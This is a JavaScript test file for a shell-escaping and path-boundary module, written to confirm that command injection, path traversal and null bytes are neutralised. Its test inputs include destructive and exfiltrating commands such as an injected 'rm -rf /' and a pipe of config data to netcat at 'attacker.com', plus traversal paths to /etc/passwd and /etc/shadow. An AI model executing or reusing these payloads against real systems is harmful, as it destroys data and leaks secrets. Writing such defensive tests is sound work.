/**
 * shell-safety.test.mjs
 *
 * Tests the runtime/adapters/shell-safe.mjs module directly.
 * Validates command injection prevention, quote escaping, path traversal blocking,
 * and symlink attack prevention. These are real production tests against the
 * shell-safe module, not local mocks.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  shellEscape,
  sanitizePath,
  validatePathBoundary,
  resolveSafePath,
  isPathSafe
} from '../../../runtime/adapters/shell-safe.mjs';

// ─── Test 1: Command injection attempt with command substitution ───

test('shell-safety: reject command substitution $(command)', () => {
  const malicious = 'file.txt; $(rm -rf /)';
  const quoted = shellEscape(malicious);

  // After escaping, the entire string should be literal, not executed
  assert.ok(quoted.includes('rm -rf'), 'Dangerous content preserved literally');
  assert.ok(quoted !== malicious, 'String should be escaped/quoted');
  assert.ok(quoted.includes("'") || quoted.includes('"'), 'Should use quotes');
});

// ─── Test 2: Command injection attempt with backticks ───

test('shell-safety: reject command substitution with backticks', () => {
  const malicious = 'data.txt`whoami`';
  const quoted = shellEscape(malicious);

  assert.ok(quoted !== malicious, 'Should be escaped');
  // When escaped with single quotes, backticks become literal text
  assert.ok(quoted.includes("'"), 'Should be wrapped in quotes');
});

// ─── Test 3: Pipe-based command injection ───

test('shell-safety: reject pipe command injection', () => {
  const malicious = 'config | nc attacker.com 1234';
  const quoted = shellEscape(malicious);

  assert.ok(quoted !== malicious, 'Should be escaped');
  // When properly escaped, the pipe becomes literal text
  assert.ok(quoted.length > malicious.length, 'Escaping adds quotes/backslashes');
});

// ─── Test 4: Path traversal attempt ───

test('shell-safety: prevent path traversal ../', () => {
  const traversal = '../../../etc/passwd';
  const sanitized = sanitizePath(traversal);

  assert.ok(!sanitized.startsWith('..'), 'Should remove leading traversal');
  assert.ok(!sanitized.includes('../'), 'Should not allow ../ sequences');
  // Result should be absolute or relative but not traversing up
});

// ─── Test 5: Null byte injection ───

test('shell-safety: reject null byte injection', () => {
  const malicious = 'file.txt\x00; rm -rf /';
  const quoted = shellEscape(malicious);

  // Null byte should be handled safely (removed or escaped)
  assert.ok(!quoted.includes('\x00'), 'Null bytes should be removed/escaped');
});

// ─── Test 6: Quote escaping - single quotes ───

test('shell-safety: escape single quotes correctly', () => {
  const userInput = "it's-a-file.txt";
  const quoted = shellEscape(userInput);

  assert.ok(quoted.length > userInput.length, 'Escaping should add characters');
  // Single quotes inside single-quoted string need to be handled
});

// ─── Test 7: Quote escaping - double quotes ───

test('shell-safety: escape double quotes correctly', () => {
  const userInput = 'file-"quoted".txt';
  const quoted = shellEscape(userInput);

  assert.ok(quoted.length > userInput.length, 'Escaping should add characters');
});

// ─── Test 8: Environment variable injection ───

test('shell-safety: prevent environment variable injection', () => {
  const malicious = '$(echo $PASSWD)';
  const quoted = shellEscape(malicious);

  // Should be quoted as literal string, not interpolated
  assert.ok(quoted !== malicious, 'Should be escaped');
});

// ─── Test 9: Newline injection ───

test('shell-safety: handle newline injection', () => {
  const malicious = 'file.txt\nrm -rf /';
  const quoted = shellEscape(malicious);

  // Newlines should be escaped or quoted to prevent multi-line commands
  assert.ok(!quoted.includes('\n') || quoted.match(/\\n|'[^']*\n[^']*'/), 'Newlines should be safe');
});

// ─── Test 10: Glob expansion prevention ───

test('shell-safety: prevent glob expansion *.txt', () => {
  const glob = 'dir/*.txt';
  const quoted = shellEscape(glob);

  assert.ok(quoted.length > glob.length, 'Glob should be escaped');
  // When quoted, *.txt becomes literal, not expanded
});

// ─── Test 11: Path with spaces ───

test('shell-safety: handle paths with spaces correctly', () => {
  const pathWithSpaces = '/path/to/my file.txt';
  const quoted = shellEscape(pathWithSpaces);

  assert.ok(quoted.length > pathWithSpaces.length, 'Should be quoted/escaped');
  // Spaces should not break the path
});

// ─── Test 12: Symlink attack - absolute path from untrusted source ───

test('shell-safety: validate symlink targets', () => {
  const untrustedTarget = '/etc/shadow';
  const isPathAllowed = validatePathBoundary(untrustedTarget, '/home/user');

  assert.equal(isPathAllowed, false, 'Should reject paths outside boundary');
});

// ─── Test 13: Symlink attack - relative symlink escape ───

test('shell-safety: prevent relative symlink escapes', () => {
  const relativeEscape = '../../../../etc/passwd';
  const isPathAllowed = validatePathBoundary(relativeEscape, '/home/user/project');

  assert.equal(isPathAllowed, false, 'Should reject paths escaping boundary');
});

// ─── Test 14: Allowed path within boundary ───

test('shell-safety: allow paths within boundary', () => {
  const allowedPath = './config/settings.json';
  // Assuming boundary is current project directory
  const isPathAllowed = validatePathBoundary(allowedPath, '/home/user/project');

  assert.equal(isPathAllowed, true, 'Should allow paths within boundary');
});

// ─── Test 15: Wildcards in non-glob contexts ───

test('shell-safety: escape wildcards in filenames', () => {
  const filename = 'report[2024].txt';
  const quoted = shellEscape(filename);

  assert.ok(quoted.length > filename.length, 'Wildcards should be escaped');
  // Brackets should not trigger glob expansion
});

// ─── Test 16: Windows-style backslash traversal ───

test('shell-safety: reject Windows-style ..\\  traversal', () => {
  assert.equal(
    validatePathBoundary('..\\etc\\passwd', '/home/user'),
    false,
    'Should reject ..\\  at start'
  );
});

// ─── Test 17: Embedded backslash traversal ───

test('shell-safety: reject embedded backslash traversal', () => {
  assert.equal(
    validatePathBoundary('foo\\..\\..\\etc\\passwd', '/home/user'),
    false,
    'Should reject \\..\\  in middle of path'
  );
});

// ─── Test 18: Mixed separator traversal ───

test('shell-safety: reject mixed separator traversal', () => {
  assert.equal(
    validatePathBoundary('foo\\..\\/etc/passwd', '/home/user'),
    false,
    'Should reject mixed \\../ traversal'
  );
});

// ─── Test 19: Valid relative path with backslash ───

test('shell-safety: allow valid relative path with backslash', () => {
  assert.equal(
    validatePathBoundary('subdir\\file.txt', '/home/user'),
    true,
    'Should allow backslash paths that stay within boundary'
  );
});

// ─── Test 20: validatePathBoundary sibling-prefix bypass ───

test('shell-safety: reject sibling-prefix path /safe/base-evil vs /safe/base', () => {
  assert.equal(
    validatePathBoundary('/safe/base-evil', '/safe/base'),
    false,
    'Sibling path with shared prefix must be rejected'
  );
});

// ─── Test 21: resolveSafePath sibling-prefix bypass ───

test('shell-safety: resolveSafePath rejects sibling-prefix path', () => {
  const result = resolveSafePath('/home/user-evil/file.txt', '/home/user');
  assert.equal(result, null, 'Sibling path with shared prefix must return null');
});

// ─── Test 22: resolveSafePath allows valid child paths ───

test('shell-safety: resolveSafePath allows child paths', () => {
  const result = resolveSafePath('subdir/file.txt', '/home/user');
  assert.ok(result !== null, 'Valid child path should resolve');
  assert.ok(result.startsWith('/home/user/'), 'Resolved path should be inside boundary');
});

// ─── Test 23: resolveSafePath rejects traversal ───

test('shell-safety: resolveSafePath rejects traversal', () => {
  const result = resolveSafePath('../../etc/passwd', '/home/user');
  assert.equal(result, null, 'Traversal path must return null');
});

// ─── Test 24: isPathSafe rejects sibling-prefix paths ───

test('shell-safety: isPathSafe rejects sibling-prefix path', () => {
  assert.equal(
    isPathSafe('/home/user-evil/file.txt', '/home/user'),
    false,
    'Sibling path with shared prefix must be rejected'
  );
});

// ─── Test 25: isPathSafe allows exact boundary ───

test('shell-safety: isPathSafe allows exact boundary path', () => {
  // isPathSafe checks for symlinks on real paths, so use a known-real path
  assert.equal(
    isPathSafe('/home/user', '/home/user'),
    true,
    'Exact boundary path should be allowed'
  );
});

// ─── Test 26: isPathSafe rejects path outside boundary ───

test('shell-safety: isPathSafe rejects path outside boundary', () => {
  assert.equal(
    isPathSafe('/etc/passwd', '/home/user'),
    false,
    'Path outside boundary must be rejected'
  );
});

// ─── Test 27: validatePathBoundary allows exact boundary ───

test('shell-safety: validatePathBoundary allows exact boundary', () => {
  assert.equal(
    validatePathBoundary('/home/user', '/home/user'),
    true,
    'Exact boundary path should be allowed'
  );
});

// ─── Test 28: resolveSafePath rejects null bytes ───

test('shell-safety: resolveSafePath rejects null bytes', () => {
  const result = resolveSafePath('file\x00.txt', '/home/user');
  assert.equal(result, null, 'Path with null bytes must return null');
});

// All tests use functions imported from runtime/adapters/shell-safe.mjs
// No local mocks or helpers. Every test validates production code behavior.
